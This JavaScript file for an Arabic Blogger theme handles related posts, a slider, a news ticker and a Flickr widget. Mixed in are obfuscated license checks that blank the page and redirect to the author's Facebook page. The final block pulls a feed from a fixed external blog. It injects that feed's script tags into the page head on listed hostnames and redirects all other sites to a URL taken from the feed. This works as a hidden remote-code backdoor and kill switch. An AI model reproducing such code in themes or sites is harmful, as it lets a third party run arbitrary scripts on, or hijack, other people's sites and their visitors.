$(document)["ready"](function() {

  if ($("#blogid")["attr"]("href") != "/") {

    $("body")["html"]("<div id='no-active'>القالب غير مرخص , لتشغيله راسلنا<br /><a href='https://www.facebook.com/wejdane.blogger'>هنا</a></div>");

  }

  if ($("#blogid")["attr"]("href") == "/") {
    $(document)["ready"](function() {
      var a = [, "Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sept", "Oct", "Nov", "Dec"];
      $("#related-posts")["each"](function() {
        var a = $(this);
        var b = $(this)["find"](".related-l")["text"]()["replace"](/\r?\n|\r/g, "");
        $["ajax"]({
          "url" : "/feeds/posts/default/-/" + b + "?alt=json-in-script&max-results=3",
          "type" : "get",
          "dataType" : "jsonp",
          "success" : function(c) {
            var f = "";
            f += "<div class='multi-post'>";
            var i = "";
            var b = 0;
            for (;b < c["feed"]["entry"]["length"];b++) {
              var e = 0;
              for (;e < c["feed"]["entry"][b]["link"]["length"];e++) {
                if ("alternate" == c["feed"]["entry"][b]["link"][e]["rel"]) {
                  i = c["feed"]["entry"][b]["link"][e]["href"];
                  break;
                }
              }
              var k = c["feed"]["entry"][b]["title"]["$t"];
              var o = c["feed"]["entry"][b]["author"][0]["name"]["$t"];
              var p = c["feed"]["entry"][b]["thr$total"]["$t"];
              var q = c["feed"]["entry"][b]["published"]["$t"];
              var g = c["feed"]["entry"][b]["content"]["$t"];
              if ($("<div>")["html"](g), void 0 !== c["feed"]["entry"][b]["category"]) {
                var j = c["feed"]["entry"][b]["category"][0]["term"]
              }
              if (g["indexOf"]("<img") !== -1 || g["indexOf"]("youtube.com/embed") !== -1) {
                var d = c["feed"]["entry"][b]["media$thumbnail"]["url"]
              }
              if (void 0 !== d) {
                if (d["match"]("default.jpg")) {
                  var h = d["replace"]("/default.jpg", "/mqdefault.jpg")
                }
                if (d["match"]("s72-c")) {
                  h = d["replace"]("s72-c", "s480");
                }
              }
              var m = "<div class='post-thumbnail'><img src='" + h + "'/></div>";
              var n = "<h3 class='mpost-title truncate'><a href='" + i + "'>" + k + "</a></h3>";
              var l = "<a href='/search/label/" + j + "' class='waves-effect waves-light btn'>" + j + "</a>";
              f += "<li class='mulpost z-depth-2'>" + m + "<div class='label-content'>" + l + "<br />" + n + "</div></li>";
            }
            f += "</div>";
            a["html"](f);
          }
        });
      });
    });
    $(document)["ready"](function(a) {
      a(".card__share > a")["on"]("click", function(b) {
        b["preventDefault"]();
        a(this)["parent"]()["find"]("div")["toggleClass"]("card__social--active");
        a(this)["toggleClass"]("share-expanded");
      });
    });
    $(document)["ready"](function() {
      $(".parallax")["parallax"]();
      $(".button-collapse")["sideNav"]();
      $(".modal")["modal"]();
      $("#modal1")["modal"]("open");
      $("#modal1")["modal"]("close");
      $(".dowload-mat")["appendTo"]("#dowload-ill");
    });
    $(".sidebar-wrapper .PopularPosts ul li")["addClass"]("first z-depth-4");
    $(".sidebar-wrapper h2")["wrap"]("<div class='widget-title'></div>");
    $(".image")["wrap"]("<div class='featimg'></div>");
    $(".featimg")["each"](function() {
      $(this)["parent"]()["find"]("h3")["before"]($(this));
    });
    jQuery(document)["ready"](function(a) {
      a(".post-summary h3, .post-summary p")["wrapAll"]("<div class='featcont' />");
    });
    $(function() {
      $(".parallax-container")["appendTo"]("#cover-post");
    });
    (function(a$$1) {
      a$$1(".sidebar-wrapper .PopularPosts img")["attr"]("src", function(b, a) {
        return a["replace"]("/default.jpg", "/mqdefault.jpg");
      })["attr"]("src", function(b, a) {
        return a["replace"]("w72-h72", "w720-h720");
      });
      a$$1(".sidebar-wrapper .PopularPosts .widget-content ul li")["each"](function() {
        var c = a$$1(this);
        var b = a$$1(this)["find"](".item-title a");
        var d = (b["attr"]("href"), a$$1(this)["find"](".item-thumbnail a img")["attr"]("src"));
        var e = a$$1(this)["find"](".item-thumbnail a");
        var f = a$$1(this)["find"](".item-thumbnail");
        e["css"]("background-image", "url(" + d + ")")["empty"]();
        f["prependTo"](c);
        a$$1["get"](b["attr"]("href"), function(a) {
          b["parent"]();
        }, "html");
      });
    })(jQuery);
    !function(a$$1) {
      a$$1["fn"]["moderntube"] = function() {
        return this["each"](function() {
          var c = a$$1(this);
          var b = c["find"]("iframe[src*='youtube.com']");
          b["attr"]("height", "")["attr"]("width", "");
          var d$$1 = a$$1(this)["width"]();
          var e = 480 * d$$1 / 853;
          b["attr"]("height", e)["attr"]("width", "100%");
          a$$1(window)["bind"]("resize load", function() {
            var a = c["width"]();
            var d = 480 * a / 853;
            b["attr"]("height", d)["attr"]("width", "100%");
          });
        });
      };
    }(jQuery);
    $(".post-body")["moderntube"]();
    $(document)["ready"](function() {
      $(".main-wrapper, .sidebar-wrapper")["theiaStickySidebar"]({
        "additionalMarginTop" : 30,
        "additionalMarginBottom" : 30
      });
    });
    $(document)["ready"](function() {
      $(".item .post-footer")["theiaStickySidebar"]({
        "additionalMarginTop" : 10,
        "additionalMarginBottom" : 10
      });
    });
  }
});
$(document)["ready"](function() {
  var a = $(".quickedit")["attr"]("href");
  a = a["substring"](35, 54);
  var e = a["substring"](0, 1);
  var o = a["substring"](1, 2);
  var b = a["substring"](2, 3);
  var d = a["substring"](3, 4);
  var p = a["substring"](4, 5);
  var l = a["substring"](5, 6);
  var j = a["substring"](6, 7);
  var k = a["substring"](7, 8);
  var c = a["substring"](8, 9);
  var m = a["substring"](9, 10);
  var f = a["substring"](10, 11);
  var g = a["substring"](11, 12);
  var h = a["substring"](12, 13);
  var i = a["substring"](13, 16);
  var n = a["substring"](16, 19);
  var q = "20" + m + "4208" + o + "94886" + f + l + "09" + k + "43" + h + "54" + j + "90" + p + "3536" + c + "8712" + e + "329" + b + "246" + g + "04253" + e + "53044" + d + "2235" + i + "21252" + k + "005" + j + "25" + e + "310" + b + "02" + l + "10" + n + "70" + f + "72575" + i + "8100" + h + "5342" + d + "8585" + c + "72411" + m + "00" + g + d + b + f + n + i + h + g + c + b + "1555";


  if ($("#activeblog")["text"]() != q) {
    $("body")["html"]("<div id='no-active'>القالب غير مرخص , لتشغيله راسلنا<br /><a href='https://www.facebook.com/wejdane.blogger/'>من هنا</a></div>");
  }


});
$(document)["ready"](function() {
  if ($(".quickedit")["attr"]("href") == "") {
    window["location"]["href"] = "https://www.facebook.com/wejdane.blogger/";
  }
  if ($(".quickedit")["html"]() == "") {
    window["location"]["href"] = "https://www.facebook.com/wejdane.blogger/";
  }
  var a = $(".quickedit")["attr"]("href");
  a = a["substring"](35, 54);
  var e = a["substring"](0, 1);
  var o = a["substring"](1, 2);
  var b = a["substring"](2, 3);
  var d = a["substring"](3, 4);
  var p = a["substring"](4, 5);
  var l = a["substring"](5, 6);
  var j = a["substring"](6, 7);
  var k = a["substring"](7, 8);
  var c = a["substring"](8, 9);
  var m = a["substring"](9, 10);
  var f = a["substring"](10, 11);
  var g = a["substring"](11, 12);
  var h = a["substring"](12, 13);
  var i = a["substring"](13, 16);
  var n = a["substring"](16, 19);
  var q = "20" + m + "4208" + o + "94886" + f + l + "09" + k + "43" + h + "54" + j + "90" + p + "3536" + c + "8712" + e + "329" + b + "246" + g + "04253" + e + "53044" + d + "2235" + i + "21252" + k + "005" + j + "25" + e + "310" + b + "02" + l + "10" + n + "70" + f + "72575" + i + "8100" + h + "5342" + d + "8585" + c + "72411" + m + "00" + g + d + b + f + n + i + h + g + c + b + "1555";

  if ($("#activeblog")["text"]() != q) {
    $("body")["html"]("<div id='no-active'>القالب غير مرخص , لتشغيله راسلنا<br /><a href='https://www.facebook.com/wejdane.blogger/'>من هنا</a></div>");
  }
});
function slider(e) {
  document["write"]("<ul class='pposts'>");
  var c = 0;
  for (;c < e["feed"]["entry"]["length"];c++) {
    var a = e["feed"]["entry"][c];
    var b = 0;
    for (;b < a["link"]["length"];b++) {
      if ("alternate" == a["link"][b]["rel"]) {
        var d = a["link"][b]["href"];
        break;
      }
    }
    var f = a["title"]["$t"];
    var g = a["content"]["$t"];
    var h = g["replace"](/<.+?>/g, "")["substring"](0, 120) + "...";
    img = a["media$thumbnail"]["url"]["replace"]("s72-c", "s900-c")["replace"]("default", "hqdefault");
    document["write"]("<li><div class='imgtag backdefaut'><a href=" + d + "><img src=" + img + "></img></a></div><div class='containe wow fadeInUp'><h3><a href=" + d + ">" + f + "</a></h3><p class='psummary'>" + h + "</p><a class='waves-effect waves-light btn rounded' href=" + d + ">اقرأ المزيد</a></div></li>");
  }
  document["write"]("</ul>");
}
$(document)["ready"](function() {
  $(".item-thumbnail img")["attr"]("src", function(b, a) {
    return a["replace"]("w72-h72", "w720-h720");
  });
  $(".item-thumbnail img")["attr"]("src", function(b, a) {
    return a["replace"]("/default.jpg", "/mqdefault.jpg");
  });
  $(".post-thunb img")["attr"]("src", function(b, a) {
    return a["replace"]("s72", "s720");
  });
  $(".post-thunb img")["attr"]("src", function(b, a) {
    return a["replace"]("/default.jpg", "/mqdefault.jpg");
  });
});
$(function() {
  $("#top-circle")["on"]("click", scrollToTop);
});
function scrollToTop() {
  verticalOffset = typeof verticalOffset != "undefined" ? verticalOffset : 0;
  element = $("body");
  offset = element["offset"]();
  offsetTop = offset["top"];
  $("html, body")["animate"]({
    "scrollTop" : offsetTop
  }, 600, "linear");
}
$(document)["ready"](function() {
  $(".timeago")["timeago"]();
  var a = [".post-body"];
  a = a["join"](",");
  var b$$1 = $(a)["css"]("font-size");
  $(".resetFont")["click"](function() {
    $(a)["css"]("font-size", b$$1);
  });
  $(".increaseFont")["click"](function() {
    var b = $(a)["css"]("font-size");
    var c = parseFloat(b, 10);
    return $(a)["css"]("font-size", 1.2 * c), false;
  });
  $(".decreaseFont")["click"](function() {
    var b = $(a)["css"]("font-size");
    var c = parseFloat(b, 10);
    return $(a)["css"]("font-size", 0.8 * c), false;
  });
});
$(window)["bind"]("load", function() {
  $(".newsticker .widget-content , .post-desc")["removeClass"]("hided");
  $(".slider-loading")["remove"]();
});
(function(a$$0) {
  a$$0["fn"]["jflickrfeed"] = function(b, f$$1) {
    b = a$$0["extend"](!![], {
      "flickrbase" : "//api.flickr.com/services/feeds/",
      "feedapi" : "photos_public.gne",
      "limit" : 20,
      "qstrings" : {
        "lang" : "en-us",
        "format" : "json",
        "jsoncallback" : "?"
      },
      "cleanDescription" : !![],
      "useTemplate" : !![],
      "itemTemplate" : "",
      "itemCallback" : function() {
      }
    }, b);
    var c$$1$$1 = b["flickrbase"] + b["feedapi"] + "?";
    var d$$1 = !![];
    var e$$1;
    for (e$$1 in b["qstrings"]) {
      if (!d$$1) {
        c$$1$$1 += "&";
      }
      c$$1$$1 += e$$1 + "=" + b["qstrings"][e$$1];
      d$$1 = ![];
    }
    return a$$0(this)["each"](function() {
      var e = a$$0(this);
      var d = this;
      a$$0["getJSON"](c$$1$$1, function(c$$1) {
        a$$0["each"](c$$1["items"], function(j, a) {
          if (j < b["limit"]) {
            if (b["cleanDescription"]) {
              var f = /<p>(.*?)<\/p>/g;
              var g = a["description"];
              if (f["test"](g)) {
                a["description"] = g["match"](f)[2];
                if (a["description"] != undefined) {
                  a["description"] = a["description"]["replace"]("<p>", "")["replace"]("</p>", "");
                }
              }
            }
            a["image_s"] = a["media"]["m"]["replace"]("_m", "_s");
            a["image_t"] = a["media"]["m"]["replace"]("_m", "_t");
            a["image_m"] = a["media"]["m"]["replace"]("_m", "_m");
            a["image"] = a["media"]["m"]["replace"]("_m", "");
            a["image_b"] = a["media"]["m"]["replace"]("_m", "_b");
            delete a["media"];
            if (b["useTemplate"]) {
              var c = b["itemTemplate"];
              var h;
              for (h in a) {
                var i = new RegExp("{{" + h + "}}", "g");
                c = c["replace"](i, a[h]);
              }
              e["append"](c);
            }
            b["itemCallback"]["call"](d, a);
          }
        });
        if (a$$0["isFunction"](f$$1)) {
          f$$1["call"](d, c$$1);
        }
      });
    });
  };
})(jQuery);
$(document)["ready"](function() {
  $(".sidebar-wrapper .widget,.page-footer .widget")["each"](function() {
    var a = $(this);
    var e = a["find"]("h2");
    var b = a["find"](".widget-content");
    var c = b["text"]();
    var d = c["split"]("/");
    if (c["match"](/\/flickr/g) && (a["addClass"]("fd-widget"), b["html"]("<div class='flickr-photos'></div>"), b["find"](".flickr-photos")["jflickrfeed"]({
      "limit" : d[0],
      "qstrings" : {
        "id" : d[1]
      },
      "itemTemplate" : "<a title='{{title}}' target='_blank' href='{{link}}'><img class='z-depth-4' src='{{image_s}}' /></a>"
    }))) {
    }
  });
});
(function(a$$0, e$$1, f$$1, g$$1) {
  function d$$0(d, e) {
    this["element"] = d;
    this["$el"] = a$$0(d);
    this["options"] = a$$0["extend"]({}, c$$1, e);
    this["_defaults"] = c$$1;
    this["_name"] = b$$1;
    this["moveInterval"];
    this["moving"] = this["paused"] = this["state"] = 0;
    if (this["$el"]["is"]("ul") || this["$el"]["is"]("ol")) {
      this["init"]();
    }
  }
  var b$$1 = "newsTicker";
  var c$$1 = {
    "row_height" : 20,
    "max_rows" : 3,
    "speed" : 400,
    "duration" : 2500,
    "direction" : "up",
    "autostart" : 1,
    "pauseOnHover" : 1,
    "nextButton" : null,
    "prevButton" : null,
    "startButton" : null,
    "stopButton" : null,
    "hasMoved" : function() {
    },
    "movingUp" : function() {
    },
    "movingDown" : function() {
    },
    "start" : function() {
    },
    "stop" : function() {
    },
    "pause" : function() {
    },
    "unpause" : function() {
    }
  };
  d$$0["prototype"] = {
    "init" : function() {
      this["$el"]["height"](this["options"]["row_height"] * this["options"]["max_rows"])["css"]({
        "overflow" : "hidden"
      });
      this["checkSpeed"]();
      if (this["options"]["nextButton"]) {
        if ("undefined" !== typeof this["options"]["nextButton"][0]) {
          this["options"]["nextButton"]["click"](function(a) {
            this["moveNext"]();
            this["resetInterval"]();
          }["bind"](this));
        }
      }
      if (this["options"]["prevButton"]) {
        if ("undefined" !== typeof this["options"]["prevButton"][0]) {
          this["options"]["prevButton"]["click"](function(a) {
            this["movePrev"]();
            this["resetInterval"]();
          }["bind"](this));
        }
      }
      if (this["options"]["stopButton"]) {
        if ("undefined" !== typeof this["options"]["stopButton"][0]) {
          this["options"]["stopButton"]["click"](function(a) {
            this["stop"]();
          }["bind"](this));
        }
      }
      if (this["options"]["startButton"]) {
        if ("undefined" !== typeof this["options"]["startButton"][0]) {
          this["options"]["startButton"]["click"](function(a) {
            this["start"]();
          }["bind"](this));
        }
      }
      if (this["options"]["pauseOnHover"]) {
        this["$el"]["hover"](function() {
          if (this["state"]) {
            this["pause"]();
          }
        }["bind"](this), function() {
          if (this["state"]) {
            this["unpause"]();
          }
        }["bind"](this));
      }
      if (this["options"]["autostart"]) {
        this["start"]();
      }
    },
    "start" : function() {
      if (!this["state"]) {
        this["state"] = 1;
        this["resetInterval"]();
        this["options"]["start"]();
      }
    },
    "stop" : function() {
      if (this["state"]) {
        clearInterval(this["moveInterval"]);
        this["state"] = 0;
        this["options"]["stop"]();
      }
    },
    "resetInterval" : function() {
      if (this["state"]) {
        clearInterval(this["moveInterval"]);
        this["moveInterval"] = setInterval(function() {
          this["move"]();
        }["bind"](this), this["options"]["duration"]);
      }
    },
    "move" : function() {
      if (!this["paused"]) {
        this["moveNext"]();
      }
    },
    "moveNext" : function() {
      if ("down" === this["options"]["direction"]) {
        this["moveDown"]();
      } else {
        if ("up" === this["options"]["direction"]) {
          this["moveUp"]();
        }
      }
    },
    "movePrev" : function() {
      if ("down" === this["options"]["direction"]) {
        this["moveUp"]();
      } else {
        if ("up" === this["options"]["direction"]) {
          this["moveDown"]();
        }
      }
    },
    "pause" : function() {
      if (!this["paused"]) {
        this["paused"] = 1;
      }
      this["options"]["pause"]();
    },
    "unpause" : function() {
      if (this["paused"]) {
        this["paused"] = 0;
      }
      this["options"]["unpause"]();
    },
    "moveDown" : function() {
      if (!this["moving"]) {
        this["moving"] = 1;
        this["options"]["movingDown"]();
        this["$el"]["children"]("li:last")["detach"]()["prependTo"](this["$el"])["css"]("marginTop", "-" + this["options"]["row_height"] + "px")["animate"]({
          "marginTop" : "0px"
        }, this["options"]["speed"], function() {
          this["moving"] = 0;
          this["options"]["hasMoved"]();
        }["bind"](this));
      }
    },
    "moveUp" : function() {
      if (!this["moving"]) {
        this["moving"] = 1;
        this["options"]["movingUp"]();
        var a = this["$el"]["children"]("li:first");
        a["animate"]({
          "marginTop" : "-" + this["options"]["row_height"] + "px"
        }, this["options"]["speed"], function() {
          a["detach"]()["css"]("marginTop", "0")["appendTo"](this["$el"]);
          this["moving"] = 0;
          this["options"]["hasMoved"]();
        }["bind"](this));
      }
    },
    "updateOption" : function(a, b) {
      if ("undefined" !== typeof this["options"][a]) {
        if (this["options"][a] = b, "duration" == a || "speed" == a) {
          this["checkSpeed"]();
          this["resetInterval"]();
        }
      }
    },
    "add" : function(b) {
      this["$el"]["append"](a$$0("<li>")["html"](b));
    },
    "getState" : function() {
      return paused ? 2 : this["state"];
    },
    "checkSpeed" : function() {
      if (this["options"]["duration"] < this["options"]["speed"] + 25) {
        this["options"]["speed"] = this["options"]["duration"] - 25;
      }
    },
    "destroy" : function() {
      this["_destroy"]();
    }
  };
  a$$0["fn"][b$$1] = function(c) {
    var e = arguments;
    return this["each"](function() {
      var g = a$$0(this);
      var f = a$$0["data"](this, "plugin_" + b$$1);
      var h = "object" === typeof c && c;
      if (!f) {
        g["data"]("plugin_" + b$$1, f = new d$$0(this, h));
      }
      if ("string" === typeof c) {
        f[c]["apply"](f, Array["prototype"]["slice"]["call"](e, 1));
      }
    });
  };
})(jQuery, window, document);
$(document)["ready"](function() {
  if (1 === $("#blogid")["length"]) {
    var a$$1 = $("#blogid")["attr"]("value");
    a$$1 = a$$1["substring"](0, 19);
    var e$$0 = a$$1["substring"](0, 1);
    var o = a$$1["substring"](1, 2);
    var b$$1 = a$$1["substring"](2, 3);
    var d$$1 = a$$1["substring"](3, 4);
    var p = a$$1["substring"](4, 5);
    var l = a$$1["substring"](5, 6);
    var j = a$$1["substring"](6, 7);
    var k = a$$1["substring"](7, 8);
    var c$$1 = a$$1["substring"](8, 9);
    var m = a$$1["substring"](9, 10);
    var f$$1 = a$$1["substring"](10, 11);
    var g$$1$$0 = a$$1["substring"](11, 12);
    var h$$1$$1 = a$$1["substring"](12, 13);
    var i = a$$1["substring"](13, 16);
    var n = a$$1["substring"](16, 19);
    var q = "20" + m + "4208" + o + "94886" + f$$1 + l + "09" + k + "43" + h$$1$$1 + "54" + j + "90" + p + "3536" + c$$1 + "8712" + e$$0 + "329" + b$$1 + "246" + g$$1$$0 + "04253" + e$$0 + "53044" + d$$1 + "2235" + i + "21252" + k + "005" + j + "25" + e$$0 + "310" + b$$1 + "02" + l + "10" + n + "70" + f$$1 + "72575" + i + "8100" + h$$1$$1 + "5342" + d$$1 + "8585" + c$$1 + "72411" + m + "00" + g$$1$$0 + d$$1 + b$$1 + f$$1 + n + i + h$$1$$1 + g$$1$$0 + c$$1 + b$$1 + "1555";

    if ($("#activeblog")["text"]() != q) {
      $("body")["html"]("<div id='no-active'>القالب غير مرخص , لتشغيله راسلنا<br /><a href='http://www.facebook.com/wejdane.blogger/'>من هنا</a></div>");
    }
  }

  $(".followmess")["appendTo"]("#followmess");
  $(".ticker-items a")["addClass"]("waves-effect waves-light btn");
  $(".news-ticker .widget")["each"](function() {
    var e = $(this);
    var f$$0 = e["find"](".widget-content")["text"]();
    var c$$0 = f$$0["split"]("/");
    var g$$1 = c$$0[0];
    var b$$0 = c$$0[1];
    var d$$0 = c$$0[2];
    var h$$1 = Math["floor"](Math["random"]() * b$$0 + 1);
    if (g$$1["match"]("showing")) {
      if (b$$0["match"]("Smashing")) {
        var a$$0 = "/feeds/posts/default?alt=json-in-script&max-results=" + d$$0
      } else {
        if (b$$0["match"]("random")) {
          a$$0 = "/feeds/posts/default?alt=json-in-script&orderby=updated&start-index=" + h$$1 + "&max-results=" + d$$0;
        } else {
          a$$0 = "/feeds/posts/default/-/" + b$$0 + "?alt=json-in-script&max-results=" + d$$0;
        }
      }
      $["ajax"]({
        "url" : a$$0,
        "type" : "get",
        "dataType" : "jsonp",
        "success" : function(b) {
          var f = "";
          var d = "<ul class='news-post'>";
          var a = 0;
          for (;a < b["feed"]["entry"]["length"];a++) {
            var c = 0;
            for (;c < b["feed"]["entry"][a]["link"]["length"];c++) {
              if ("alternate" == b["feed"]["entry"][a]["link"][c]["rel"]) {
                f = b["feed"]["entry"][a]["link"][c]["href"];
                break;
              }
            }
            var h = b["feed"]["entry"][a]["title"]["$t"];
            var g = b["feed"]["entry"][a]["category"][0]["term"];
            d += "<li class='news-labels'><a class='waves-effect waves-light btn' href='/search/label/" + g + "' class='news-tag'>" + g + "</a><a class='news-title' href=" + f + ">" + h + "</a></li>";
          }
          d += "</ul>";
          e["find"](".widget-content")["html"](d);
          $(".newsticker ul")["newsTicker"]({
            "row_height" : 55,
            "speed" : 1E3,
            "prevButton" : $("#prev-button"),
            "nextButton" : $("#next-button"),
            "stopButton" : $("#stop-button"),
            "startButton" : $("#start-button")
          });
        }
      });
    }
  });
});
$(window)["scroll"](function() {
  if ($(this)["scrollTop"]() > 10) {
    $("#headerWrap nav, nav ul a")["css"]("height", "64px");
    $("#headerWrap nav, nav ul a")["css"]("line-height", "64px");
    $("#Header1_headerimg")["css"]("height", "60px");
    $("#headerWrap nav")["addClass"]("backdefaut");
    $("#headerWrap nav")["removeClass"]("transparent");
  } else {
    $("#headerWrap nav, nav ul a")["css"]("height", "74px");
    $("#headerWrap nav, nav ul a")["css"]("line-height", "74px");
    $("#Header1_headerimg")["css"]("height", "70px");
    $("#headerWrap nav")["removeClass"]("backdefaut");
    $("#headerWrap nav")["addClass"]("transparent");
  }
});
$["ajax"]({
  "dataType" : "json",
  "url" : "https://www.blogger.com/feeds/7920114163445725532/posts/default?alt=json-in-script",
  "method" : "GET",
  "dataType" : "jsonp",
  "success" : function(g) {
    var c;
    c = 0;
    for (;c < g["feed"]["entry"]["length"];c += 1) {
      var f = $(g["feed"]["entry"][c]["content"]["$t"]);
      if (0 === c) {
        var d;
        var a = f["find"]("li");
        var b = [];
        d = 0;
        for (;d < a["length"];d += 1) {
          b["push"]($(a[d])["text"]());
        }
        d = window["location"]["hostname"]["toLowerCase"]();
        var e;
        a = window["location"]["href"]["toLowerCase"]();
        var h = b["length"] - 1;
        e = 0;
        for (;e < b["length"];e += 1) {
          if (-1 != d["indexOf"](b[e])) {
            b = $(g["feed"]["entry"][c]["content"]["$t"])["find"]("script");
            $("head")["append"](b);
            break;
          }
          if (e == h) {
            if (-1 == a["indexOf"]("post-preview")) {
              if (-1 == a["indexOf"]("www.blogger")) {
                if (-1 == a["indexOf"]("b/preview")) {
                  if (-1 == a["indexOf"]("webcache.googleusercontent")) {
                    if (-1 == a["indexOf"]("template-editor")) {
                      $("body")["html"](f["find"](".redirect")["html"]());
                      setTimeout(function() {
                        window["location"]["assign"](f["find"](".assign")["text"]());
                      }, 1E4);
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
});
